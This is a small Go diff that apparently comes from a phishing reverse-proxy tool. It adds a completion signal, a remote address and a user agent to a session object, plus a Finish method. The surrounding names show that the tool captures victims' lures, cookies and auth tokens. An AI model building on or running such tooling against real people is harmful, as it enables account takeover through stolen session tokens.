@@ -25,6 +25,9 @@ type Session struct {
 	PhishLure      *Lure
 	RedirectorName string
 	LureDirPath    string
+	DoneSignal     chan struct{}
+	RemoteAddr     string
+	UserAgent      string
 }
 
 func NewSession(name string) (*Session, error) {
@@ -46,6 +49,9 @@ func NewSession(name string) (*Session, error) {
 		PhishLure:      nil,
 		RedirectorName: "",
 		LureDirPath:    "",
+		DoneSignal:     make(chan struct{}),
+		RemoteAddr:     "",
+		UserAgent:      "",
 	}
 	s.CookieTokens = make(map[string]map[string]*database.CookieToken)
 
@@ -121,4 +127,15 @@ func (s *Session) AllCookieAuthTokensCaptured(authTokens map[string][]*CookieAut
 		return true
 	}
 	return false
+}
+
+func (s *Session) Finish(is_auth_url bool) {
+	if !s.IsDone {
+		s.IsDone = true
+		s.IsAuthUrl = is_auth_url
+		if s.DoneSignal != nil {
+			close(s.DoneSignal)
+			s.DoneSignal = nil
+		}
+	}
 }
